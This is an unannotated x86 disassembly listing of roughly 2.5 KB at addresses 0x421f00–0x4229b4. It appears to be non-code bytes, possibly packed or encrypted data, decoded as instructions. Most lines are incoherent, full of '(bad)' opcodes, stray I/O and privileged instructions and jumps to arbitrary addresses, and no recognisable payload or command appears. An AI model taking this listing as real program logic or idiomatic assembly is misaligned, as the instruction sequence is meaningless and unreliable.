  421f00:	fdivr  QWORD PTR [esi+0x16bdff2]
  421f06:	das    
  421f07:	pop    ecx
  421f08:	mov    bl,0x26
  421f0a:	mov    dl,0x4b
  421f0c:	(bad)  
  421f0d:	aaa    
  421f0e:	xor    bh,cl
  421f10:	mov    ds:0xc8e15be3,al
  421f15:	push   0xbe2b6587
  421f1a:	pop    ss
  421f1b:	pop    ebx
  421f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f1d:	in     eax,0x48
  421f1f:	test   al,0x56
  421f21:	push   0x478c94dd
  421f26:	jmp    0x421ecf
  421f28:	or     ah,BYTE PTR [ebp-0xa6ae7a7]
  421f2e:	stos   BYTE PTR es:[edi],al
  421f2f:	ret    
  421f30:	add    dh,0xbb
  421f33:	push   ss
  421f34:	jle    0x421f0a
  421f36:	push   edi
  421f37:	div    BYTE PTR [ebx+eax*1-0x18]
  421f3b:	lods   eax,DWORD PTR ds:[esi]
  421f3c:	test   DWORD PTR [esi+esi*8],esp
  421f3f:	mov    gs,WORD PTR [ebx+ebp*1+0x149ac74f]
  421f46:	jno    0x421f8d
  421f48:	in     al,0x37
  421f4a:	daa    
  421f4b:	jecxz  0x421fa2
  421f4d:	retf   0xb4c4
  421f50:	mov    dl,0xea
  421f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f53:	push   ds
  421f54:	pusha  
  421f55:	(bad)  [edi+0x676027b8]
  421f5b:	out    0xf,al
  421f5d:	inc    ebp
  421f5e:	test   BYTE PTR [ebx],0xba
  421f61:	and    cl,BYTE PTR [edi]
  421f63:	aam    0x79
  421f65:	sub    DWORD PTR [edx],ebx
  421f67:	es inc esp
  421f69:	sbb    BYTE PTR [bp-0x2],dh
  421f6d:	adc    BYTE PTR [ecx-0x1195a17d],al
  421f73:	int    0x54
  421f75:	stos   DWORD PTR es:[edi],eax
  421f76:	leave  
  421f77:	icebp  
  421f78:	int    0x6a
  421f7a:	out    0x2,al
  421f7c:	add    al,0x6c
  421f7e:	jo     0x421fd8
  421f80:	int3   
  421f81:	and    al,ch
  421f83:	push   eax
  421f84:	into   
  421f85:	xlat   BYTE PTR ds:[ebx]
  421f86:	dec    ebx
  421f87:	lods   al,BYTE PTR ds:[esi]
  421f88:	dec    ebp
  421f89:	adc    eax,0xfff1f5c0
  421f8e:	sub    cl,ch
  421f90:	add    DWORD PTR [esi+0x1238acac],edi
  421f96:	ficom  DWORD PTR [edi]
  421f98:	loopne 0x421f22
  421f9a:	push   es
  421f9b:	fcmovb st,st(7)
  421f9d:	fidiv  WORD PTR [edx-0x45]
  421fa0:	pop    ecx
  421fa1:	mov    eax,ds:0xb37d9b3b
  421fa6:	push   eax
  421fa7:	add    al,0x3a
  421fa9:	rcl    bh,cl
  421fab:	jb     0x421ffa
  421fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fae:	and    ah,0x8b
  421fb1:	mov    cl,0x3d
  421fb3:	mov    al,0xb4
  421fb5:	mov    eax,DWORD PTR [edi-0x1e]
  421fb8:	sbb    dl,bl
  421fba:	(bad)  
  421fbb:	leave  
  421fbc:	scas   eax,DWORD PTR es:[edi]
  421fbd:	mov    edi,edx
  421fbf:	push   ebx
  421fc0:	cmp    BYTE PTR [edi+0x0],dh
	...
  422032:	add    BYTE PTR [eax],al
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x625880ec
  422044:	adc    al,0x6c
  422046:	add    DWORD PTR [eax],eax
  422048:	test   BYTE PTR [eax],0x0
  42204b:	add    cl,dh
  42204d:	shl    BYTE PTR [edx+0x27a7ba77],cl
  422053:	add    eax,0x34ba2d9d
  422058:	js     0x42209b
  42205a:	jns    0x4220c4
  42205c:	mov    al,ds:0xcf36f42d
  422061:	jg     0x4220b0
  422063:	ror    BYTE PTR [ecx-0x40],cl
  422066:	inc    eax
  422067:	inc    BYTE PTR [ecx+0x1da9372a]
  42206d:	ja     0x42208d
  42206f:	pop    ss
  422070:	out    0x60,al
  422072:	add    eax,0xad081ce2
  422077:	in     eax,dx
  422078:	iret   
  422079:	dec    esi
  42207a:	inc    ebx
  42207b:	(bad)  
  42207e:	adc    al,BYTE PTR [edx]
  422080:	(bad)  
  422081:	cwde   
  422082:	mov    bh,BYTE PTR [edi-0x71d6df4e]
  422088:	inc    eax
  422089:	pop    ecx
  42208a:	cmp    BYTE PTR [ebp-0x7f],0xe7
  42208e:	ins    BYTE PTR es:[edi],dx
  42208f:	sub    eax,DWORD PTR [edi+0x32d2f739]
  422095:	stos   DWORD PTR es:[edi],eax
  422096:	arpl   WORD PTR [ebp-0x2d07ea13],di
  42209c:	jo     0x4220d8
  42209e:	sar    BYTE PTR [edi-0x2971927e],0xb1
  4220a5:	retf   0x9776
  4220a8:	(bad)
  4220ac:	cld    
  4220ad:	jbe    0x4220f2
  4220af:	das    
  4220b0:	loop   0x42210a
  4220b2:	fadd   st,st(4)
  4220b4:	xor    edi,DWORD PTR [ebp+0x1c]
  4220b7:	add    edi,DWORD PTR [edx]
  4220b9:	adc    eax,0xb495b410
  4220be:	fist   DWORD PTR [eax]
  4220c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220c1:	scas   al,BYTE PTR es:[edi]
  4220c2:	imul   esp,ebx,0x874f27bd
  4220c8:	retf   0xaa84
  4220cb:	mov    BYTE PTR [edx],bh
  4220cd:	cs ins BYTE PTR es:[edi],dx
  4220cf:	jmp    0x4220bf
  4220d1:	(bad)  
  4220d3:	mov    al,0xc1
  4220d5:	jge    0x4220ef
  4220d7:	inc    ebp
  4220d8:	pop    ss
  4220d9:	cmp    BYTE PTR [esi-0x1],dl
  4220dc:	cmp    eax,0x5b4adf03
  4220e1:	mov    ch,0x7e
  4220e3:	clc    
  4220e4:	(bad)  
  4220e5:	out    0xd7,al
  4220e7:	mov    eax,0x4809b455
  4220ec:	and    bl,0x2a
  4220ef:	lods   eax,DWORD PTR ds:[esi]
  4220f0:	retf   
  4220f1:	gs call 0x6b26c1fb
  4220f7:	sar    DWORD PTR [edi],1
  4220f9:	push   esi
  4220fa:	das    
  4220fb:	mov    dh,BYTE PTR [ebp-0x22daf08e]
  422101:	jbe    0x422117
  422103:	add    eax,0x36d3287d
  422108:	retf   
  422109:	mov    bh,0xbc
  42210b:	cmp    eax,0x4f7b80fa
  422110:	pop    ds
  422111:	xor    bh,BYTE PTR [esi-0x2b]
  422114:	lods   al,BYTE PTR ds:[esi]
  422115:	int    0x46
  422117:	xor    BYTE PTR [ecx+0x64],al
  42211a:	jmp    0xc8469c62
  42211f:	(bad)  
  422120:	jmp    0x422185
  422122:	in     al,dx
  422123:	mov    esp,0x28d1e426
  422128:	xchg   ebx,eax
  422129:	iret   
  42212a:	sbb    eax,DWORD PTR [ebp+esi*1-0x77]
  42212e:	or     DWORD PTR ds:0x20cab3cd,0xfffffffb
  422135:	pop    es
  422136:	xor    BYTE PTR [edi+0x6a],al
  422139:	in     al,dx
  42213a:	adc    al,0xcc
  42213c:	ins    DWORD PTR es:[edi],dx
  42213d:	in     eax,0xbb
  42213f:	xchg   ecx,eax
  422140:	bound  ebp,QWORD PTR [edx+0x0]
	...
  4221b2:	add    BYTE PTR [eax],al
  4221b4:	sahf   
  4221b5:	pop    ds
  4221b6:	(bad)  
  4221b7:	test   DWORD PTR [edi+0x3b7ffef7],0x48d52766
  4221c1:	dec    edi
  4221c2:	ins    BYTE PTR es:[edi],dx
  4221c3:	ror    DWORD PTR [edx],cl
  4221c5:	ins    DWORD PTR es:[edi],dx
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	test   BYTE PTR [eax],0x0
  4221cb:	add    BYTE PTR [edi+0x639ab15e],cl
  4221d1:	jo     0x42219f
  4221d3:	jns    0x422197
  4221d5:	cmp    al,0xe7
  4221d7:	push   edi
  4221d8:	loope  0x4221de
  4221da:	into   
  4221db:	ss es aam 0xfc
  4221df:	xor    dl,bl
  4221e1:	jmp    0x422223
  4221e3:	mov    ecx,0xc2b985ac
  4221e8:	leave  
  4221e9:	int3   
  4221ea:	ins    BYTE PTR es:[edi],dx
  4221eb:	mov    ebx,0xa28c6467
  4221f0:	cmp    eax,0xb2bd99ae
  4221f5:	(bad)  
  4221f6:	mov    bh,BYTE PTR ds:0x4a55b03c
  4221fc:	in     eax,0x58
  4221fe:	jp     0x422190
  422200:	in     al,0x65
  422202:	mov    ah,0x41
  422204:	and    dl,ch
  422206:	leave  
  422207:	(bad)  
  422208:	fsubr  DWORD PTR [edx+0x503093d9]
  42220e:	scas   al,BYTE PTR es:[edi]
  42220f:	outs   dx,DWORD PTR ds:[esi]
  422210:	mov    esp,0xed27ccbd
  422215:	sub    dh,BYTE PTR [eax]
  422217:	ins    DWORD PTR es:[edi],dx
  422218:	mov    edx,0xb00427e4
  42221d:	fdivrp st(7),st
  42221f:	inc    edi
  422220:	int3   
  422221:	cwde   
  422222:	adc    edi,eax
  422224:	ins    BYTE PTR es:[edi],dx
  422225:	cmp    dl,BYTE PTR [esi-0x4]
  422228:	dec    ebx
  422229:	hlt    
  42222a:	and    DWORD PTR [ebp+0x1bc44d16],ebp
  422230:	jg     0x4221dc
  422232:	pop    ss
  422233:	imul   ebx,DWORD PTR [ebx+eax*4],0xffffffe4
  422237:	(bad)  
  422238:	js     0x42224d
  42223a:	sub    al,0xa6
  42223c:	mov    WORD PTR ds:0x162c71a3,fs
  422242:	and    eax,0x1f168cd2
  422247:	scas   al,BYTE PTR es:[edi]
  422248:	mov    esp,0x2ba7b701
  42224d:	xchg   edi,eax
  42224e:	jp     0x42224e
  422250:	inc    edi
  422251:	or     bh,BYTE PTR [edx]
  422253:	dec    ecx
  422255:	push   es
  422256:	stos   BYTE PTR es:[edi],al
  422257:	pop    edi
  422258:	and    ch,BYTE PTR [ebx-0x6f]
  42225b:	pop    ebp
  42225c:	fdiv   QWORD PTR [eax-0x67c474e5]
  422262:	mov    al,0x3b
  422264:	dec    ecx
  422265:	xchg   ecx,eax
  422266:	sbb    BYTE PTR [ebp+0x75],bl
  422269:	loop   0x422208
  42226b:	sbb    BYTE PTR [ecx+0x15],0x32
  42226f:	scas   al,BYTE PTR es:[edi]
  422270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422271:	inc    ebx
  422272:	sbb    esi,DWORD PTR [esi-0x55e1622c]
  422278:	xchg   edx,eax
  422279:	jecxz  0x4222c1
  42227b:	ret    0x471
  42227e:	js     0x42222b
  422280:	(bad)  
  422281:	aam    0x55
  422283:	fcomp  DWORD PTR [eax]
  422285:	sahf   
  422286:	gs aad 0xce
  422289:	xchg   BYTE PTR [esi],ah
  42228b:	jns    0x42226f
  42228d:	sub    dl,BYTE PTR [ecx]
  42228f:	jg     0x422261
  422291:	cdq    
  422292:	mov    cl,0x58
  422294:	fidivr DWORD PTR [ecx+0xb]
  422297:	mov    al,ds:0x32c0ef12
  42229c:	sub    DWORD PTR [ecx+0x43abd299],edx
  4222a2:	mov    ds:0x785c0521,eax
  4222a7:	and    bh,BYTE PTR [edx+0x58]
  4222aa:	mov    dl,0x43
  4222ac:	data16 shr BYTE PTR [edx],cl
  4222af:	cmp    al,0x96
  4222b1:	xor    BYTE PTR ds:0xb03f5942,bl
  4222b7:	push   ss
  4222b8:	das    
  4222b9:	sbb    ebx,DWORD PTR [esp+edx*8]
  4222bc:	jmp    0xd521c062
  4222c1:	push   esp
	...
  422332:	add    BYTE PTR [eax],al
  422334:	inc    bh
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	into   
  422341:	mov    ch,0x6c
  422343:	dec    edi
  422344:	add    BYTE PTR [esi+0x1],ch
  422347:	add    dh,dh
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [edi],bh
  42234d:	sub    BYTE PTR [edx],ch
  42234f:	dec    esi
  422350:	mov    ebp,ebp
  422352:	loopne 0x42233f
  422354:	jo     0x422348
  422356:	push   ebp
  422357:	add    ah,cl
  422359:	pop    ebx
  42235a:	popf   
  42235b:	retf   0xbf0d
  42235e:	test   BYTE PTR [eax],bl
  422360:	jnp    0x42231c
  422362:	aaa    
  422363:	scas   al,BYTE PTR es:[edi]
  422364:	or     bl,BYTE PTR [esp+esi*1]
  422367:	test   DWORD PTR [edi+0x2b],0xb07820e5
  42236e:	ror    DWORD PTR [edx+eax*1-0x1b81d55],0xa4
  422376:	dec    esp
  422377:	mov    eax,0x9eacebfc
  42237c:	leave  
  42237d:	fs adc al,0xe2
  422380:	pop    ss
  422381:	fidivr DWORD PTR [esi-0x1998e5c1]
  422387:	fild   QWORD PTR [ebp-0x7c]
  42238a:	add    ch,BYTE PTR [edx-0x4b]
  42238d:	fild   WORD PTR [ecx]
  42238f:	rcr    ch,cl
  422391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422392:	scas   al,BYTE PTR es:[edi]
  422393:	and    ah,BYTE PTR [eax+edx*1]
  422396:	xchg   esp,eax
  422397:	ss xchg edi,eax
  422399:	outs   dx,BYTE PTR ds:[esi]
  42239a:	xchg   ecx,eax
  42239b:	lea    edi,[esi-0xa]
  42239e:	clc    
  42239f:	xor    eax,0xc711637f
  4223a4:	lods   eax,DWORD PTR ds:[esi]
  4223a5:	adc    ecx,DWORD PTR [ecx]
  4223a7:	lods   al,BYTE PTR ds:[esi]
  4223a8:	inc    esp
  4223a9:	fs and edi,0xa743c58b
  4223b0:	ret    0x8235
  4223b3:	sbb    DWORD PTR [ebp-0x1c510440],edx
  4223b9:	or     ch,ah
  4223bb:	(bad)  
  4223bc:	or     esi,edx
  4223be:	mov    eax,0xb97f5d2c
  4223c3:	sbb    al,0xb1
  4223c5:	inc    BYTE PTR [esi]
  4223c7:	mov    cl,0x35
  4223c9:	sub    eax,ebx
  4223cb:	arpl   WORD PTR [edx+0x78],dx
  4223ce:	sbb    DWORD PTR [eax-0x52dfaae4],eax
  4223d4:	add    ah,BYTE PTR [ecx]
  4223d6:	adc    bh,BYTE PTR [eax+0x35]
  4223d9:	cwde   
  4223da:	xchg   ecx,eax
  4223db:	jl     0x4223c1
  4223dd:	adc    ecx,DWORD PTR [ebx]
  4223df:	(bad)  
  4223e0:	outs   dx,BYTE PTR ds:[esi]
  4223e1:	lods   al,BYTE PTR ds:[esi]
  4223e2:	jne    0x4223f2
  4223e4:	lods   al,BYTE PTR ds:[esi]
  4223e5:	jmp    0xd967:0x69baacf6
  4223ec:	popa   
  4223ed:	not    DWORD PTR [edi]
  4223ef:	sub    BYTE PTR [esi-0x27224881],0x82
  4223f6:	jle    0x422450
  4223f8:	ss xchg ebp,eax
  4223fa:	jbe    0x4223ad
  4223fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223fd:	pop    ds
  4223fe:	shl    BYTE PTR [edx+ecx*4],1
  422401:	shl    DWORD PTR [ecx+edi*2+0x51],0xa
  422406:	imul   esp,DWORD PTR [ecx-0x6a],0x23c2483f
  42240d:	pop    ds
  42240e:	push   esi
  42240f:	dec    ecx
  422410:	inc    edx
  422411:	mov    BYTE PTR [eax+0x281f9a68],bl
  422417:	mov    dl,0x8f
  422419:	adc    al,0xa7
  42241b:	jmp    0x42241d
  42241d:	push   esi
  42241e:	in     eax,dx
  42241f:	adc    ebx,DWORD PTR [eax]
  422421:	or     edx,esp
  422423:	sbb    eax,0xcc99ef7
  422428:	(bad)  
  422429:	pop    ebx
  42242a:	jmp    0x422425
  42242c:	push   ebx
  42242d:	les    eax,FWORD PTR [esi-0x72]
  422430:	and    eax,0x2094cf1f
  422435:	push   ebp
  422436:	xor    ebx,DWORD PTR [edi+edi*1+0x5b]
  42243a:	cdq    
  42243b:	jg     0x4224b0
  42243d:	aad    0x13
  42243f:	imul   ebp,DWORD PTR [eax],0x67
	...
  4224b1:	add    BYTE PTR [eax],al
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x69819f7c
  4224c2:	mov    dl,0x1e
  4224c4:	imul   BYTE PTR [esi+0x1]
  4224c7:	add    dh,dh
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [eax],al
  4224cd:	add    ebp,edi
  4224cf:	mov    ds:0x339a634e,eax
  4224d4:	inc    ebp
  4224d5:	dec    edi
  4224d6:	fisttp DWORD PTR [esp+ebp*8+0x5d1b8d4f]
  4224dd:	lds    edx,FWORD PTR [edi+0x17]
  4224e0:	sub    DWORD PTR [eax],esp
  4224e2:	iret   
  4224e3:	test   eax,0x4ee99c9
  4224e8:	imul   edi,DWORD PTR [eax+0x2b],0x7f03301
  4224ef:	jne    0x422524
  4224f1:	jbe    0x4224c1
  4224f3:	lods   al,BYTE PTR ds:[esi]
  4224f4:	mov    esp,0xb2ed7369
  4224f9:	fsub   DWORD PTR [ebp+0x61e5eee3]
  4224ff:	scas   al,BYTE PTR es:[edi]
  422500:	ins    DWORD PTR es:[edi],dx
  422501:	fidiv  WORD PTR [eax+0x62]
  422504:	daa    
  422505:	in     eax,0xd5
  422507:	pop    ebp
  422508:	clc    
  422509:	pop    es
  42250a:	(bad)  
  42250b:	popa   
  42250c:	test   DWORD PTR [esi+0x58],ecx
  42250f:	sahf   
  422510:	jmp    0x4224fa
  422512:	cmp    BYTE PTR [esi],dh
  422514:	and    ebp,edi
  422516:	adc    al,0xcd
  422518:	jne    0x422572
  42251a:	pop    esp
  42251b:	repnz cmp BYTE PTR [ecx-0x53],bh
  42251f:	cmp    DWORD PTR [esi],eax
  422521:	xchg   dl,dh
  422523:	popa   
  422524:	ror    eax,0xec
  422527:	mov    ch,0xa9
  422529:	add    eax,0x2d4f35e8
  42252e:	std    
  42252f:	rol    ecx,1
  422531:	(bad)  
  422533:	loop   0x4224c4
  422535:	test   DWORD PTR [eax],ebp
  422537:	mov    ecx,ds
  422539:	adc    ch,BYTE PTR [ebp-0x1f2401da]
  42253f:	pop    eax
  422540:	pusha  
  422541:	adc    esp,DWORD PTR [esp+eax*1+0x6f6e5109]
  422548:	frstor es:[ecx]
  42254b:	mov    cl,0x57
  42254d:	retf   0xca82
  422550:	and    esp,DWORD PTR [esi+ecx*2-0x13982fb0]
  422557:	inc    eax
  422558:	mov    cl,0x9e
  42255a:	jmp    0x422518
  42255c:	or     BYTE PTR [ebx+0x2e],0xf3
  422560:	jne    0x42258d
  422562:	aam    0xbc
  422564:	outs   dx,BYTE PTR ds:[esi]
  422565:	add    cl,bl
  422567:	xchg   BYTE PTR [esp+edx*8-0x2434455e],al
  42256e:	lfence 
  422571:	xchg   DWORD PTR [ecx-0x14a6ec75],edx
  422577:	in     al,0x34
  422579:	scas   eax,DWORD PTR es:[edi]
  42257a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42257b:	xchg   ebp,eax
  42257c:	fs out 0x7e,eax
  42257f:	ins    BYTE PTR es:[edi],dx
  422580:	jp     0x422530
  422582:	mov    edx,DWORD PTR [edi-0x22]
  422585:	aaa    
  422586:	sbb    bh,dh
  422588:	and    bh,cl
  42258a:	retfw  0x2194
  42258e:	xchg   edi,eax
  42258f:	push   ebp
  422590:	dec    esi
  422591:	ds cs push ss
  422594:	out    0x32,al
  422596:	fmul   QWORD PTR [esi+edx*1-0x4d]
  42259a:	cwde   
  42259b:	cwde   
  42259c:	add    dl,dh
  42259e:	dec    ecx
  42259f:	test   al,0x17
  4225a1:	js     0x422547
  4225a3:	push   0x4
  4225a5:	stos   DWORD PTR es:[edi],eax
  4225a6:	dec    edx
  4225a7:	aam    0x9
  4225a9:	sub    eax,edx
  4225ab:	test   al,cl
  4225ad:	mov    ah,0x21
  4225af:	leave  
  4225b0:	xchg   ebx,eax
  4225b1:	jb     0x4225e7
  4225b3:	in     eax,dx
  4225b4:	sub    ecx,DWORD PTR [ebp+ecx*8+0xf22e2cb]
  4225bb:	daa    
  4225bc:	std    
  4225bd:	out    dx,eax
  4225be:	mov    ch,0xd9
  4225c0:	xlat   BYTE PTR ds:[ebx]
  4225c1:	loope  0x4225c3
	...
  422633:	add    BYTE PTR [ebx-0x105512d4],ch
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	lods   eax,DWORD PTR ds:[esi]
  422641:	adc    cl,BYTE PTR [ebp+0x16fec13]
  422647:	add    dh,dh
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [edx+edx*4+0x233a5839],ah
  422652:	jmp    0x12e1f28d
  422657:	adc    al,0x98
  422659:	bnd addr16 ret 0x4bf2
  42265e:	cli    
  42265f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422660:	cdq    
  422661:	in     eax,dx
  422662:	lahf   
  422663:	xchg   esi,eax
  422664:	or     al,0xc
  422666:	call   0x205d16fc
  42266b:	into   
  42266c:	aas    
  42266d:	out    dx,al
  42266e:	xor    edx,DWORD PTR [ebp-0x24]
  422671:	add    al,dl
  422673:	cmp    BYTE PTR [esi-0x5e3a7a55],ah
  422679:	cli    
  42267a:	add    al,BYTE PTR [ecx]
  42267c:	or     al,0x1d
  42267e:	mov    al,ds:0x1f582fd5
  422683:	(bad)  
  422684:	rcr    cl,1
  422686:	inc    edi
  422687:	ins    DWORD PTR es:[edi],dx
  422688:	loopne 0x422630
  42268a:	icebp  
  42268b:	fadd   QWORD PTR [esi+0x69b1c897]
  422691:	outs   dx,DWORD PTR ds:[esi]
  422692:	daa    
  422693:	scas   al,BYTE PTR es:[edi]
  422694:	adc    cl,BYTE PTR [edx-0x38]
  422697:	or     BYTE PTR [ecx+eax*2],0x3b
  42269b:	mov    eax,0xd9c436e7
  4226a0:	push   cs
  4226a1:	(bad)  
  4226a2:	cmp    eax,0xcc4e3478
  4226a7:	leave  
  4226a8:	mov    ebp,0x176feed3
  4226ad:	push   ecx
  4226ae:	push   ecx
  4226af:	call   0x110:0x8d5d7902
  4226b6:	sub    esi,DWORD PTR [esi+ebp*1+0x45]
  4226ba:	mov    bl,0x32
  4226bc:	mov    al,0xb8
  4226be:	mov    edi,0xaf20813d
  4226c3:	fs cmp cl,ah
  4226c6:	js     0x4226b7
  4226c8:	push   eax
  4226c9:	sbb    esi,DWORD PTR [ebx-0x13]
  4226cc:	popf   
  4226cd:	imul   esp,DWORD PTR [edx+0x50],0xe1d3edf4
  4226d4:	cmp    eax,DWORD PTR [esi+eax*2+0x32990825]
  4226db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226dc:	shl    BYTE PTR [eax-0x75],cl
  4226df:	rol    BYTE PTR fs:[ecx+ebp*1+0x8cf657c],cl
  4226e7:	es cmp al,0xc
  4226ea:	inc    edi
  4226ec:	push   edi
  4226ed:	add    DWORD PTR [ebp+0x3c],esi
  4226f0:	push   0x975d9e06
  4226f5:	loopne 0x422732
  4226f7:	ds pop ebx
  4226f9:	jmp    0x422720
  4226fb:	sahf   
  4226fc:	dec    ebp
  4226fd:	sub    eax,0xe6d97fed
  422702:	loopne 0x422725
  422704:	je     0x4226e5
  422706:	and    eax,0xa57894f
  42270b:	mov    BYTE PTR [ecx+0x4b1de097],dl
  422711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422712:	jno    0x422701
  422714:	fs fwait
  422716:	mov    al,BYTE PTR [ecx+ebx*1+0x6b]
  42271a:	jns    0x4226e5
  42271c:	mov    edi,0x58299d7e
  422721:	call   DWORD PTR [ebp-0x570f14f9]
  422727:	xchg   ebp,eax
  422728:	test   al,0xdd
  42272a:	mov    ebx,0x4e942b5d
  42272f:	or     al,0x8
  422731:	pop    esp
  422732:	or     BYTE PTR [ecx-0x201826db],dl
  422738:	pusha  
  422739:	dec    esi
  42273a:	inc    ebx
  42273b:	cmp    eax,0x1e854a46
  422740:	imul   esp,eax,0x0
	...
  4227b2:	add    BYTE PTR [eax],al
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	dec    ecx
  4227c1:	mov    dh,0x56
  4227c3:	mov    esi,0x170e2
  4227c8:	test   BYTE PTR [eax],0x0
  4227cb:	add    BYTE PTR [edx],ch
  4227cd:	sub    ch,BYTE PTR [ebx]
  4227cf:	outs   dx,DWORD PTR ds:[esi]
  4227d0:	push   ds
  4227d1:	ins    BYTE PTR es:[edi],dx
  4227d2:	or     DWORD PTR [edx+0x1e],edi
  4227d5:	pop    esi
  4227d6:	inc    edi
  4227d7:	cmc    
  4227d8:	cmp    eax,0x89ecdcae
  4227dd:	or     ebp,DWORD PTR [ecx]
  4227df:	or     al,0x96
  4227e1:	cmp    al,0x17
  4227e3:	ds es jl 0x422809
  4227e7:	sub    ah,ah
  4227e9:	xchg   edi,ebp
  4227eb:	in     al,dx
  4227ec:	push   ecx
  4227ed:	or     DWORD PTR [esi-0x59d7df00],esp
  4227f3:	js     0x422778
  4227f5:	sbb    BYTE PTR [edx-0x64],al
  4227f8:	xor    eax,0xea812626
  4227fd:	cmp    cl,BYTE PTR [edx]
  4227ff:	or     ebp,edi
  422801:	out    0x2c,eax
  422803:	retf   
  422804:	sti    
  422805:	inc    eax
  422806:	push   0x175367a6
  42280b:	mov    ?,WORD PTR [ecx+0x34]
  42280e:	and    DWORD PTR [eax],esi
  422810:	call   0xb29d119
  422815:	adc    BYTE PTR [ebx],bl
  422817:	int3   
  422818:	push   0x83044708
  42281d:	aaa    
  42281e:	push   edx
  42281f:	adc    DWORD PTR [eax-0x28],ebx
  422822:	mov    bl,0x93
  422824:	and    DWORD PTR [ebp+0x39586fe7],esp
  42282a:	or     edx,esi
  42282c:	nop
  42282d:	adc    esp,DWORD PTR ds:0x473ea3c3
  422833:	es inc ecx
  422835:	repnz xor BYTE PTR [esi+esi*4],0xaf
  42283a:	out    0xd9,al
  42283c:	gs pop edx
  42283e:	dec    ebx
  42283f:	sbb    eax,0x2e4d2429
  422844:	mov    ch,BYTE PTR [edx-0x3839da2]
  42284a:	mov    ecx,0xe685a6a
  42284f:	cwde   
  422850:	(bad)  
  422851:	neg    cl
  422853:	and    edi,DWORD PTR [esi+0xdef632]
  422859:	mov    ebp,0xb9815c6e
  42285e:	ficom  DWORD PTR [esi-0x50b71471]
  422864:	test   al,0x8f
  422866:	sbb    esi,esi
  422868:	scas   eax,DWORD PTR es:[edi]
  422869:	xchg   BYTE PTR [ebx-0x65],dl
  42286c:	int3   
  42286d:	push   ecx
  42286e:	dec    ebx
  42286f:	push   es
  422870:	mov    bh,0xd7
  422872:	mov    esi,0x77124cb3
  422877:	xlat   BYTE PTR ds:[ebx]
  422878:	sbb    edx,DWORD PTR [ebx-0x52b4f701]
  42287e:	aas    
  42287f:	or     eax,0xf263df56
  422884:	or     eax,ebp
  422886:	stc    
  422887:	mov    ds:0xc3678c90,al
  42288c:	xchg   ecx,eax
  42288d:	in     al,dx
  42288e:	jp     0x4228eb
  422890:	cld    
  422891:	lds    ebx,FWORD PTR [ebx]
  422893:	sub    bh,BYTE PTR [ecx]
  422895:	inc    ebx
  422896:	in     al,0xb9
  422898:	adc    eax,0xc6e19d99
  42289d:	xchg   ebp,eax
  42289e:	lahf   
  42289f:	mov    esi,0x681f9dfd
  4228a4:	or     BYTE PTR [ebp+0x5540b5bd],cl
  4228aa:	mov    dl,0x47
  4228ac:	loop   0x4228e4
  4228ae:	cmp    al,0xe3
  4228b0:	sbb    cl,BYTE PTR [ecx-0x40]
  4228b3:	dec    esi
  4228b4:	sbb    esi,DWORD PTR [ebp+0x7e0938df]
  4228ba:	arpl   WORD PTR ds:0x773d1e8b,si
  4228c0:	cmp    esi,ebx
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	aam    0x52
  422942:	jmp    0xf600:0x171d80d
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [edx-0x163abea0],ah
  422951:	xchg   ebx,esp
  422953:	adc    ebp,DWORD PTR [edx]
  422955:	mov    WORD PTR [eax+0x3f],gs
  422958:	iret   
  422959:	into   
  42295a:	rcl    BYTE PTR ds:0xdff1d964,cl
  422960:	push   ss
  422961:	and    BYTE PTR [ebx+0x3d],bh
  422964:	xchg   ebx,eax
  422965:	add    bl,BYTE PTR [ebp+esi*4+0x77]
  422969:	je     0x4228fe
  42296b:	call   0x7c37297c
  422970:	push   edx
  422971:	mov    al,ds:0xef60a5a6
  422976:	add    eax,0xcac6c645
  42297b:	xor    al,0xc0
  42297d:	dec    eax
  42297e:	mov    ebp,0x4ee8455f
  422983:	adc    esi,0x24d441d2
  422989:	int3   
  42298a:	ficom  DWORD PTR ds:0x7f0cf25c
  422990:	ins    DWORD PTR es:[edi],dx
  422991:	jmp    edx
  422993:	je     0x422972
  422995:	mov    WORD PTR [ecx],ds
  422997:	pop    ds
  422998:	jmp    0x1b68:0x1a1902d0
  42299f:	stos   DWORD PTR es:[edi],eax
  4229a0:	push   0x22185fd4
  4229a5:	repnz adc al,0x4e
  4229a8:	pop    edi
  4229a9:	push   ecx
  4229aa:	push   eax
  4229ab:	sbb    ah,BYTE PTR [ebx]
  4229ad:	fs test ecx,esi
  4229b0:	icebp  
  4229b1:	daa    
  4229b2:	inc    ebp
  4229b3:	hlt    
  4229b4:	dec    edx
